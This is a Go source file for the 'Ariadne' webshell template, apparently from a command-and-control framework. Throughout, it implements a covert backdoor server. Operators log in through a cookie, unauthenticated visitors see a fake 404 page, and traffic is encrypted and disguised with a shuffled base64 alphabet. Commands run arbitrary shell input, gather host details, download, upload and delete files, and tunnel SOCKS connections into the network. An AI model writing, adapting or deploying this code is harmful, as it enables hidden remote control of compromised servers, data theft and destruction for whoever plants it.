package main

// Ariadne Go webshell template
// Tokens replaced at build time.

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/rand"
	"crypto/sha256"
	"encoding/base64"
	"encoding/hex"
	"encoding/json"
	"encoding/xml"
	"fmt"
	"io"
	"log"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

// =============================================================================
// BUILD-TIME CONFIGURATION (tokens replaced by the Ariadne builder)
// =============================================================================

const (
	ariadneUUID             = `52f713f7-f347-45f6-a8a5-c340d4852651`
	ariadneAuthMethod       = `cookie`
	ariadneAuthName         = `ARIADNE_SID`
	ariadneAuthValue        = `ariadne-go-final`
	ariadneEncoding         = `deformed_base64`
	ariadneDeformedAlphabet = `wf017PKWyi+YSvIAqNMzELeCTshx2rDQj86GO4dbFn39ZtolRagkBcmuXHJ5V/Up`
	ariadneStandardAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
	ariadneEncryption       = `aes256_cbc`
	ariadneAESKey           = `laaDJjd12nCB4W+VSekcXfGBvBB80vy90Z5eUwWGeo0=`
	ariadneRequestTemplate  = `form_post`
	ariadneRequestParam     = `data`
	ariadneResponseCT       = `text/html`
)

var ariadneCamouflageHTML = `<!DOCTYPE html>
<html>
<head><title>404 - File or directory not found.</title>
<style>body{font-family:"Segoe UI",Tahoma,Arial,sans-serif;margin:0;background:#eee}
.container{max-width:800px;margin:50px auto;background:#fff;border:1px solid #ddd;padding:40px}
h1{color:#c00;font-size:24px;border-bottom:1px solid #ccc;padding-bottom:10px}
h2{color:#555;font-size:16px;font-weight:normal}
p{color:#777;font-size:13px;line-height:1.6}</style></head>
<body><div class="container">
<h1>Server Error</h1>
<h2>404 - File or directory not found.</h2>
<p>The resource you are looking for might have been removed, had its name changed, or is temporarily unavailable.</p>
</div></body></html>
`

const (
	ariadneResponseStatus = 200
	ariadneEnableSOCKS    = false
	ariadneEnableP2PHTTP  = false
	ariadneEnableP2PTCP   = false
	ariadneTCPPort        = 7443
	ariadneDebug          = true
)

// =============================================================================
// GLOBALS
// =============================================================================

// SOCKS tunnel sessions
var tunnelSessions sync.Map // map[string]net.Conn

// P2P message queue
var (
	p2pMu        sync.Mutex
	p2pQueueFile string
)

func debugLog(format string, args ...interface{}) {
	if ariadneDebug {
		log.Printf("[ariadne-debug] "+format, args...)
	}
}

// =============================================================================
// ENCODING
// =============================================================================

// buildReplacer creates a strings.Replacer that maps characters from src to dst.
func buildReplacer(src, dst string) *strings.Replacer {
	srcRunes := []rune(src)
	dstRunes := []rune(dst)
	pairs := make([]string, 0, len(srcRunes)*2)
	for i := 0; i < len(srcRunes) && i < len(dstRunes); i++ {
		pairs = append(pairs, string(srcRunes[i]), string(dstRunes[i]))
	}
	return strings.NewReplacer(pairs...)
}

func ariadneEncode(data []byte) string {
	switch ariadneEncoding {
	case "deformed_base64":
		standard := base64.StdEncoding.EncodeToString(data)
		replacer := buildReplacer(ariadneStandardAlphabet, ariadneDeformedAlphabet)
		return replacer.Replace(standard)
	case "standard_base64":
		return base64.StdEncoding.EncodeToString(data)
	case "hex":
		return hex.EncodeToString(data)
	default:
		return base64.StdEncoding.EncodeToString(data)
	}
}

func ariadneDecode(encoded string) ([]byte, error) {
	switch ariadneEncoding {
	case "deformed_base64":
		replacer := buildReplacer(ariadneDeformedAlphabet, ariadneStandardAlphabet)
		standard := replacer.Replace(encoded)
		return base64.StdEncoding.DecodeString(standard)
	case "standard_base64":
		return base64.StdEncoding.DecodeString(encoded)
	case "hex":
		return hex.DecodeString(encoded)
	default:
		return base64.StdEncoding.DecodeString(encoded)
	}
}

// =============================================================================
// ENCRYPTION: AES-256-CBC with HMAC-SHA256
// Format: IV(16) || ciphertext || HMAC(32)
// =============================================================================

func pkcs7Pad(data []byte, blockSize int) []byte {
	padding := blockSize - (len(data) % blockSize)
	pad := make([]byte, padding)
	for i := range pad {
		pad[i] = byte(padding)
	}
	return append(data, pad...)
}

func pkcs7Unpad(data []byte) ([]byte, error) {
	if len(data) == 0 {
		return nil, fmt.Errorf("empty data")
	}
	padding := int(data[len(data)-1])
	if padding == 0 || padding > aes.BlockSize || padding > len(data) {
		return nil, fmt.Errorf("invalid padding")
	}
	for i := len(data) - padding; i < len(data); i++ {
		if data[i] != byte(padding) {
			return nil, fmt.Errorf("invalid padding bytes")
		}
	}
	return data[:len(data)-padding], nil
}

func ariadneEncrypt(plaintext []byte) ([]byte, error) {
	if ariadneEncryption != "aes256_cbc" || ariadneAESKey == "" {
		return plaintext, nil
	}

	key, err := base64.StdEncoding.DecodeString(ariadneAESKey)
	if err != nil {
		return nil, fmt.Errorf("decode AES key: %w", err)
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("create cipher: %w", err)
	}

	padded := pkcs7Pad(plaintext, aes.BlockSize)

	iv := make([]byte, aes.BlockSize)
	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
		return nil, fmt.Errorf("generate IV: %w", err)
	}

	ciphertext := make([]byte, len(padded))
	mode := cipher.NewCBCEncrypter(block, iv)
	mode.CryptBlocks(ciphertext, padded)

	// blob = IV || ciphertext
	blob := append(iv, ciphertext...)

	// HMAC-SHA256 over IV || ciphertext
	mac := hmac.New(sha256.New, key)
	mac.Write(blob)
	hmacVal := mac.Sum(nil)

	// result = IV || ciphertext || HMAC
	return append(blob, hmacVal...), nil
}

func ariadneDecrypt(data []byte) ([]byte, error) {
	if ariadneEncryption != "aes256_cbc" || ariadneAESKey == "" {
		return data, nil
	}

	key, err := base64.StdEncoding.DecodeString(ariadneAESKey)
	if err != nil {
		return nil, fmt.Errorf("decode AES key: %w", err)
	}

	// Minimum size: IV(16) + at least one block(16) + HMAC(32) = 64
	if len(data) < 64 {
		return nil, fmt.Errorf("ciphertext too short")
	}

	hmacReceived := data[len(data)-32:]
	ivAndCt := data[:len(data)-32]

	// Verify HMAC
	mac := hmac.New(sha256.New, key)
	mac.Write(ivAndCt)
	hmacComputed := mac.Sum(nil)

	if !hmac.Equal(hmacComputed, hmacReceived) {
		return nil, fmt.Errorf("HMAC verification failed")
	}

	iv := ivAndCt[:16]
	ciphertext := ivAndCt[16:]

	if len(ciphertext)%aes.BlockSize != 0 {
		return nil, fmt.Errorf("ciphertext not block-aligned")
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return nil, fmt.Errorf("create cipher: %w", err)
	}

	mode := cipher.NewCBCDecrypter(block, iv)
	decrypted := make([]byte, len(ciphertext))
	mode.CryptBlocks(decrypted, ciphertext)

	return pkcs7Unpad(decrypted)
}

// =============================================================================
// AUTHENTICATION
// =============================================================================

func ariadneAuthenticate(r *http.Request) bool {
	var value string

	switch ariadneAuthMethod {
	case "cookie":
		c, err := r.Cookie(ariadneAuthName)
		if err == nil {
			value = c.Value
		}
	case "header":
		value = r.Header.Get(ariadneAuthName)
	case "parameter":
		value = r.FormValue(ariadneAuthName)
		if value == "" {
			value = r.URL.Query().Get(ariadneAuthName)
		}
	}

	return hmac.Equal([]byte(ariadneAuthValue), []byte(value))
}

// =============================================================================
// REQUEST BODY EXTRACTION
// =============================================================================

func ariadneExtractPayload(r *http.Request) (string, error) {
	switch ariadneRequestTemplate {
	case "form_post":
		return r.FormValue(ariadneRequestParam), nil

	case "json_api":
		body, err := io.ReadAll(r.Body)
		if err != nil {
			return "", err
		}
		var parsed map[string]interface{}
		if err := json.Unmarshal(body, &parsed); err != nil {
			return "", err
		}
		if val, ok := parsed[ariadneRequestParam]; ok {
			return fmt.Sprintf("%v", val), nil
		}
		return "", nil

	case "image_data":
		val := r.FormValue(ariadneRequestParam)
		const prefix = "data:image/png;base64,"
		if strings.HasPrefix(val, prefix) {
			return val[len(prefix):], nil
		}
		return val, nil

	case "xml_soap":
		body, err := io.ReadAll(r.Body)
		if err != nil {
			return "", err
		}
		return extractSOAPParam(body, ariadneRequestParam)

	default:
		body, err := io.ReadAll(r.Body)
		if err != nil {
			return "", err
		}
		return string(body), nil
	}
}

// soapEnvelope is a minimal SOAP envelope parser.
type soapEnvelope struct {
	Body soapBody `xml:"Body"`
}

type soapBody struct {
	Inner []byte `xml:",innerxml"`
}

func extractSOAPParam(data []byte, param string) (string, error) {
	decoder := xml.NewDecoder(strings.NewReader(string(data)))
	decoder.Strict = false

	var envelope soapEnvelope
	if err := decoder.Decode(&envelope); err != nil {
		// Try non-namespaced fallback
		type simpleEnvelope struct {
			XMLName xml.Name `xml:"Envelope"`
			Body    struct {
				Inner []byte `xml:",innerxml"`
			} `xml:"Body"`
		}
		var se simpleEnvelope
		if err2 := xml.Unmarshal(data, &se); err2 != nil {
			return "", fmt.Errorf("xml parse: %w", err)
		}
		envelope.Body.Inner = se.Body.Inner
	}

	// Parse inner XML to find the parameter element
	innerDecoder := xml.NewDecoder(strings.NewReader(string(envelope.Body.Inner)))
	for {
		tok, err := innerDecoder.Token()
		if err != nil {
			break
		}
		if se, ok := tok.(xml.StartElement); ok {
			if se.Name.Local == param {
				var content string
				if err := innerDecoder.DecodeElement(&content, &se); err == nil {
					return content, nil
				}
			}
		}
	}

	return "", nil
}

// =============================================================================
// COMMAND HANDLERS
// =============================================================================

func cmdCheckin(taskID string) string {
	hostname, _ := os.Hostname()
	osName := runtime.GOOS
	username := "unknown"
	if u, err := user.Current(); err == nil {
		username = u.Username
	}

	domain := ""
	// Attempt to resolve domain on Windows
	if runtime.GOOS == "windows" {
		if out, err := exec.Command("cmd.exe", "/c", "echo", "%USERDOMAIN%").Output(); err == nil {
			d := strings.TrimSpace(string(out))
			if d != "" && d != "%USERDOMAIN%" {
				domain = d
			}
		}
	}

	pid := os.Getpid()
	arch := runtime.GOARCH
	cwd, _ := os.Getwd()

	ips := getLocalIPs()

	return fmt.Sprintf("0|%s|%s|%s|%s|%s|%d|%s|%s|%s",
		taskID, hostname, osName, username, domain, pid, arch, cwd, ips)
}

func getLocalIPs() string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		return ""
	}
	var ips []string
	for _, addr := range addrs {
		if ipNet, ok := addr.(*net.IPNet); ok && !ipNet.IP.IsLoopback() {
			if ipNet.IP.To4() != nil {
				ips = append(ips, ipNet.IP.String())
			}
		}
	}
	return strings.Join(ips, ",")
}

func cmdShell(taskID, command string) string {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command("cmd.exe", "/c", command)
	} else {
		cmd = exec.Command("/bin/sh", "-c", command)
	}

	output, err := cmd.CombinedOutput()
	if err != nil {
		// Still return output even on non-zero exit
		if len(output) > 0 {
			return fmt.Sprintf("0|%s|%s", taskID, strings.TrimRight(string(output), "\r\n"))
		}
		return fmt.Sprintf("1|%s|%s", taskID, err.Error())
	}

	return fmt.Sprintf("0|%s|%s", taskID, strings.TrimRight(string(output), "\r\n"))
}

// lsEntry represents a directory listing entry.
type lsEntry struct {
	Name        string `json:"name"`
	IsFile      bool   `json:"is_file"`
	Size        int64  `json:"size"`
	Permissions string `json:"permissions"`
	ModifyTime  string `json:"modify_time"`
}

// lsResult represents the full directory listing result.
type lsResult struct {
	Host       string    `json:"host"`
	ParentPath string    `json:"parent_path"`
	Files      []lsEntry `json:"files"`
}

func cmdLs(taskID, path string) string {
	entries, err := os.ReadDir(path)
	if err != nil {
		return fmt.Sprintf("1|%s|Cannot read directory: %s", taskID, err.Error())
	}

	absPath, _ := filepath.Abs(path)
	hostname, _ := os.Hostname()

	files := make([]lsEntry, 0, len(entries))
	for _, entry := range entries {
		info, err := entry.Info()
		if err != nil {
			continue
		}
		perm := fmt.Sprintf("%04o", info.Mode().Perm())
		mtime := info.ModTime().Format("2006-01-02 15:04:05")
		size := info.Size()
		if entry.IsDir() {
			size = 0
		}
		files = append(files, lsEntry{
			Name:        entry.Name(),
			IsFile:      !entry.IsDir(),
			Size:        size,
			Permissions: perm,
			ModifyTime:  mtime,
		})
	}

	result := lsResult{
		Host:       hostname,
		ParentPath: absPath,
		Files:      files,
	}

	jsonBytes, err := json.Marshal(result)
	if err != nil {
		return fmt.Sprintf("1|%s|JSON marshal error: %s", taskID, err.Error())
	}

	return fmt.Sprintf("0|%s|%s", taskID, string(jsonBytes))
}

func cmdCd(taskID, path string) string {
	if err := os.Chdir(path); err != nil {
		return fmt.Sprintf("1|%s|Cannot change directory to: %s", taskID, path)
	}
	cwd, _ := os.Getwd()
	return fmt.Sprintf("0|%s|%s", taskID, cwd)
}

func cmdPwd(taskID string) string {
	cwd, _ := os.Getwd()
	return fmt.Sprintf("0|%s|%s", taskID, cwd)
}

// downloadResult represents the download response payload.
type downloadResult struct {
	Filename string `json:"filename"`
	Filepath string `json:"filepath"`
	Size     int64  `json:"size"`
	Data     string `json:"data"`
}

func cmdDownload(taskID, filePath string) string {
	info, err := os.Stat(filePath)
	if err != nil {
		return fmt.Sprintf("1|%s|File not found: %s", taskID, filePath)
	}

	contents, err := os.ReadFile(filePath)
	if err != nil {
		return fmt.Sprintf("1|%s|Failed to read file: %s", taskID, err.Error())
	}

	absPath, _ := filepath.Abs(filePath)

	result := downloadResult{
		Filename: filepath.Base(filePath),
		Filepath: absPath,
		Size:     info.Size(),
		Data:     base64.StdEncoding.EncodeToString(contents),
	}

	jsonBytes, err := json.Marshal(result)
	if err != nil {
		return fmt.Sprintf("1|%s|JSON marshal error: %s", taskID, err.Error())
	}

	return fmt.Sprintf("0|%s|%s", taskID, string(jsonBytes))
}

func cmdUpload(taskID, remotePath, b64Content string) string {
	dir := filepath.Dir(remotePath)
	if err := os.MkdirAll(dir, 0755); err != nil {
		return fmt.Sprintf("1|%s|Cannot create directory: %s", taskID, err.Error())
	}

	content, err := base64.StdEncoding.DecodeString(b64Content)
	if err != nil {
		return fmt.Sprintf("1|%s|Base64 decode error: %s", taskID, err.Error())
	}

	if err := os.WriteFile(remotePath, content, 0644); err != nil {
		return fmt.Sprintf("1|%s|Failed to write file: %s", taskID, err.Error())
	}

	return fmt.Sprintf("0|%s|Uploaded %d bytes to %s", taskID, len(content), remotePath)
}

func cmdRm(taskID, path string) string {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		return fmt.Sprintf("1|%s|Path not found: %s", taskID, path)
	}

	if err := os.RemoveAll(path); err != nil {
		return fmt.Sprintf("1|%s|Failed to remove: %s", taskID, err.Error())
	}

	return fmt.Sprintf("0|%s|Removed: %s", taskID, path)
}

// =============================================================================
// SOCKS TUNNEL HANDLERS
// =============================================================================

func tunnelConnect(mark, data string) string {
	if !ariadneEnableSOCKS {
		return "1|SOCKS tunneling not enabled"
	}

	target, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return "1|Invalid base64 target"
	}

	parts := strings.SplitN(string(target), ":", 2)
	if len(parts) != 2 {
		return "1|Connection target invalid"
	}

	addr := parts[0] + ":" + parts[1]
	conn, err := net.DialTimeout("tcp", addr, 10*time.Second)
	if err != nil {
		return fmt.Sprintf("1|Connection failed: %s", err.Error())
	}

	tunnelSessions.Store(mark, conn)
	return "0|Connected"
}

func tunnelForward(mark, data string) string {
	val, ok := tunnelSessions.Load(mark)
	if !ok {
		return fmt.Sprintf("1|No tunnel session: %s", mark)
	}

	conn := val.(net.Conn)

	raw, err := base64.StdEncoding.DecodeString(data)
	if err != nil {
		return "1|Invalid base64 data"
	}

	n, err := conn.Write(raw)
	if err != nil {
		conn.Close()
		tunnelSessions.Delete(mark)
		return "1|Write failed"
	}

	return fmt.Sprintf("0|%d", n)
}

func tunnelRead(mark string) string {
	val, ok := tunnelSessions.Load(mark)
	if !ok {
		return fmt.Sprintf("1|No tunnel session: %s", mark)
	}

	conn := val.(net.Conn)
	conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))

	buf := make([]byte, 0, 524288)
	tmp := make([]byte, 8192)
	for {
		n, err := conn.Read(tmp)
		if n > 0 {
			buf = append(buf, tmp[:n]...)
		}
		if err != nil {
			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
				break
			}
			// Connection closed or error
			conn.Close()
			tunnelSessions.Delete(mark)
			encoded := base64.StdEncoding.EncodeToString(buf)
			return fmt.Sprintf("0|%s", encoded)
		}
		if len(buf) >= 524288 {
			break
		}
	}

	encoded := base64.StdEncoding.EncodeToString(buf)
	return fmt.Sprintf("0|%s", encoded)
}

func tunnelDisconnect(mark string) string {
	if val, ok := tunnelSessions.Load(mark); ok {
		conn := val.(net.Conn)
		conn.Close()
		tunnelSessions.Delete(mark)
	}
	return "0|Disconnected"
}

// =============================================================================
// P2P MESSAGE QUEUE (file-based push/drain)
// =============================================================================

func p2pInit() {
	p2pQueueFile = filepath.Join(os.TempDir(), ".ariadne_p2p_"+ariadneUUID)
}

func p2pQueuePush(message string) {
	p2pMu.Lock()
	defer p2pMu.Unlock()
	f, err := os.OpenFile(p2pQueueFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0600)
	if err != nil {
		debugLog("p2p push error: %v", err)
		return
	}
	defer f.Close()
	f.WriteString(message + "\n")
}

func p2pQueueDrain() string {
	p2pMu.Lock()
	defer p2pMu.Unlock()

	data, err := os.ReadFile(p2pQueueFile)
	if err != nil {
		return ""
	}
	// Truncate the queue file
	os.WriteFile(p2pQueueFile, []byte{}, 0600)
	return strings.TrimSpace(string(data))
}

// =============================================================================
// MAIN HANDLER
// =============================================================================

func handler(w http.ResponseWriter, r *http.Request) {
	// --- Authentication ---
	if !ariadneAuthenticate(r) {
		debugLog("authentication failed from %s", r.RemoteAddr)
		if ariadneResponseStatus == 200 {
			w.WriteHeader(404)
		} else {
			w.WriteHeader(ariadneResponseStatus)
		}
		fmt.Fprint(w, ariadneCamouflageHTML)
		return
	}

	// --- Extract payload ---
	encodedPayload, err := ariadneExtractPayload(r)
	if err != nil || encodedPayload == "" {
		debugLog("empty or invalid payload")
		w.Header().Set("Content-Type", ariadneResponseCT)
		w.WriteHeader(ariadneResponseStatus)
		fmt.Fprint(w, ariadneCamouflageHTML)
		return
	}

	// --- Decode ---
	raw, err := ariadneDecode(encodedPayload)
	if err != nil {
		debugLog("decode error: %v", err)
		w.WriteHeader(500)
		return
	}

	// --- Decrypt ---
	plaintext, err := ariadneDecrypt(raw)
	if err != nil {
		debugLog("decrypt error: %v", err)
		w.WriteHeader(500)
		return
	}

	debugLog("received command: %s", string(plaintext))

	// --- Parse pipe protocol: action|task_id|args... ---
	parts := strings.SplitN(string(plaintext), "|", -1)
	action := ""
	taskID := ""
	if len(parts) > 0 {
		action = parts[0]
	}
	if len(parts) > 1 {
		taskID = parts[1]
	}

	// --- Execute ---
	var response string

	switch action {
	case "checkin":
		response = cmdCheckin(taskID)

	case "shell":
		command := ""
		if len(parts) > 2 {
			command = strings.Join(parts[2:], "|")
		}
		response = cmdShell(taskID, command)

	case "ls":
		path := "."
		if len(parts) > 2 {
			path = parts[2]
		}
		response = cmdLs(taskID, path)

	case "cd":
		path := "."
		if len(parts) > 2 {
			path = parts[2]
		}
		response = cmdCd(taskID, path)

	case "pwd":
		response = cmdPwd(taskID)

	case "download":
		filePath := ""
		if len(parts) > 2 {
			filePath = parts[2]
		}
		response = cmdDownload(taskID, filePath)

	case "upload":
		remotePath := ""
		b64Content := ""
		if len(parts) > 2 {
			remotePath = parts[2]
		}
		if len(parts) > 3 {
			b64Content = parts[3]
		}
		response = cmdUpload(taskID, remotePath, b64Content)

	case "rm":
		path := ""
		if len(parts) > 2 {
			path = parts[2]
		}
		response = cmdRm(taskID, path)

	case "tunnel":
		if !ariadneEnableSOCKS {
			response = "1|SOCKS tunneling not enabled"
		} else {
			mark := ""
			tunnelCmd := ""
			tunnelData := ""
			if len(parts) > 1 {
				mark = parts[1]
			}
			if len(parts) > 2 {
				tunnelCmd = parts[2]
			}
			if len(parts) > 3 {
				tunnelData = parts[3]
			}
			switch tunnelCmd {
			case "CONNECT":
				response = tunnelConnect(mark, tunnelData)
			case "FORWARD":
				response = tunnelForward(mark, tunnelData)
			case "READ":
				response = tunnelRead(mark)
			case "DISCONNECT":
				response = tunnelDisconnect(mark)
			default:
				response = fmt.Sprintf("1|Unknown tunnel command: %s", tunnelCmd)
			}
		}

	case "poll", "poll_p2p":
		p2pData := ""
		if ariadneEnableP2PHTTP && action == "poll_p2p" {
			p2pData = p2pQueueDrain()
		}
		response = fmt.Sprintf("0|poll|%s", p2pData)

	default:
		response = fmt.Sprintf("1|%s|Unknown action: %s", taskID, action)
	}

	debugLog("response: %s", response)

	// --- Encrypt ---
	encrypted, err := ariadneEncrypt([]byte(response))
	if err != nil {
		debugLog("encrypt error: %v", err)
		w.WriteHeader(500)
		return
	}

	// --- Encode ---
	encodedResponse := ariadneEncode(encrypted)

	// --- Write response ---
	w.Header().Set("Content-Type", ariadneResponseCT)
	w.WriteHeader(ariadneResponseStatus)
	fmt.Fprintf(w, `<span id="r">%s</span>`, encodedResponse)
}

// =============================================================================
// P2P TCP LISTENER (optional)
// =============================================================================

func startP2PTCPListener() {
	if !ariadneEnableP2PTCP || ariadneTCPPort <= 0 {
		return
	}

	addr := "0.0.0.0:" + strconv.Itoa(ariadneTCPPort)
	ln, err := net.Listen("tcp", addr)
	if err != nil {
		debugLog("P2P TCP listen error on %s: %v", addr, err)
		return
	}
	debugLog("P2P TCP listener started on %s", addr)

	go func() {
		for {
			conn, err := ln.Accept()
			if err != nil {
				debugLog("P2P TCP accept error: %v", err)
				continue
			}
			go handleP2PConn(conn)
		}
	}()
}

func handleP2PConn(conn net.Conn) {
	defer conn.Close()
	conn.SetReadDeadline(time.Now().Add(30 * time.Second))

	data, err := io.ReadAll(conn)
	if err != nil {
		debugLog("P2P TCP read error: %v", err)
		return
	}

	msg := strings.TrimSpace(string(data))
	if msg != "" {
		p2pQueuePush(msg)
		debugLog("P2P TCP queued message (%d bytes)", len(msg))
	}
}

// =============================================================================
// ENTRY POINT
// =============================================================================

func main() {
	p2pInit()

	// Start optional P2P TCP listener
	startP2PTCPListener()

	http.HandleFunc("/", handler)

	listenAddr := "0.0.0.0:8080"
	debugLog("Ariadne webshell starting on %s (UUID: %s)", listenAddr, ariadneUUID)

	if err := http.ListenAndServe(listenAddr, nil); err != nil {
		log.Fatalf("server error: %v", err)
	}
}
